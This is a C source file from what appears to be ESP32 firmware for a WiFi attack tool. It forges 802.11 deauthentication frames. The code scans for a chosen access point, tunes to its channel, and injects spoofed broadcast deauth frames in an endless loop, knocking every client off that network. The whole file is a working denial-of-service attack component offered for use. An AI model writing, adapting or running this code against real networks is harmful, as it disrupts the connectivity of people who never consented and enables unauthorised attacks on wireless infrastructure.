/**
 * @file arma_deauth.c
 * @author johndeweyzxc (johndewey02003@gmail.com)
 * @brief Implementation of methods for injecting deauthentication frame
 */

#include "arma_deauth.h"

#include <stdio.h>
#include <string.h>

#include "arma_utils.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "wifi_ctl_interface.h"

static TaskHandle_t arma_deauth_task_handle = NULL;
static uint8_t u_target_bssid[6];
/**
 * Subtype (1 byte)
 * Flags (1 byte)
 * Duration (2 bytes)
 * Receiver address (6 bytes)
 * Source address (6 bytes)
 * BSSID (6 bytes)
 * Sequence number (2 bytes)
 * Reason code (2 bytes)
 */
static uint8_t deauth_payload[] = {0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff,
                                   0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00,
                                   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                   0x00, 0x00, 0x00, 0x07, 0x00};

void arma_deauth_set_target(char *target_bssid) {
  for (uint8_t i = 0; i < 6; i++) {
    uint8_t s1 = target_bssid[i + i];
    uint8_t s2 = target_bssid[i + i + 1];
    u_target_bssid[i] = convert_to_uint8_t(s1, s2);
  }
  printf(
      "arma_deauth.arma_deauth_set_target > Target set AP: "
      "%02X%02X%02X%02X%02X%02X\n",
      u_target_bssid[0], u_target_bssid[1], u_target_bssid[2],
      u_target_bssid[3], u_target_bssid[4], u_target_bssid[5]);
}

void load_deauth_payload() {
  memcpy(&deauth_payload[10], u_target_bssid, 6);
  memcpy(&deauth_payload[16], u_target_bssid, 6);
}

void arma_run_deauth() {
  uint8_t *b = u_target_bssid;
  printf("{DEAUTH,DEAUTH_STARTED,%02X%02X%02X%02X%02X%02X,}\n", b[0], b[1],
         b[2], b[3], b[4], b[5]);
  int current_time = 0;

  while (1) {
    vTaskDelay(1000 / portTICK_PERIOD_MS);
    wifi_inject_frame(deauth_payload, 26);
    printf("{DEAUTH,INJECTED_DEAUTH,%d,}\n", current_time);
    current_time++;
  }
}

void arma_deauth_inject() {
  for (uint8_t i = 0; i < 3; i++) {
    vTaskDelay(100 / portTICK_PERIOD_MS);
    wifi_inject_frame(deauth_payload, 26);
  }
}

void arma_deauth_finish() {
  if (arma_deauth_task_handle != NULL) {
    vTaskDelete(arma_deauth_task_handle);
    arma_deauth_task_handle = NULL;
  }
}

void arma_deauth_launching_sequence(uint8_t channel) {
  printf("{DEAUTH,LAUNCHING_SEQUENCE,}\n");
  wifi_set_channel(channel);
  xTaskCreatePinnedToCore(arma_run_deauth, TDI_NAME, TDI_STACK_SIZE, NULL,
                          TDI_PRIORITY, &arma_deauth_task_handle, TDI_CORE_ID);
}

void arma_deauth(char *target_bssid) {
  arma_deauth_set_target(target_bssid);
  load_deauth_payload();

  wifi_scan_aps();
  ap_list_from_scan_t *ap_list = wifi_get_scanned_aps();
  wifi_ap_record_t *ap_records = ap_list->ap_record_list;
  uint8_t total_scanned_aps = ap_list->count;

  printf("{DEAUTH,FOUND_APS,%u,}\n", total_scanned_aps);

  uint8_t found_target_ap = 0;
  uint8_t index_of_target_ap = 0;
  for (uint8_t i = 0; i < total_scanned_aps; i++) {
    wifi_ap_record_t ap_record = ap_records[i];
    uint8_t *bssid = ap_record.bssid;

    printf("{DEAUTH,SCAN,%02X%02X%02X%02X%02X%02X,", bssid[0], bssid[1],
           bssid[2], bssid[3], bssid[4], bssid[5]);
    print_string_into_hex(ap_record.ssid);
    printf("%d,%u,}\n", ap_record.rssi, ap_record.primary);

    if (memcmp(ap_record.bssid, u_target_bssid, 6) == 0) {
      found_target_ap = 1;
      index_of_target_ap = i;
    }
  }
  printf("{DEAUTH,FINISH_SCAN,}\n");

  if (found_target_ap == 1) {
    wifi_ap_record_t ap_record = ap_records[index_of_target_ap];
    uint8_t channel = ap_record.primary;
    printf("arma_deauth.arma_deauth > Channel of target AP: %u\n", channel);
    arma_deauth_launching_sequence(channel);
  } else if (found_target_ap == 0) {
    uint8_t *b = u_target_bssid;
    printf("{DEAUTH,AP_NOT_FOUND,%02X%02X%02X%02X%02X%02X,}\n", b[0], b[1],
           b[2], b[3], b[4], b[5]);
  }
}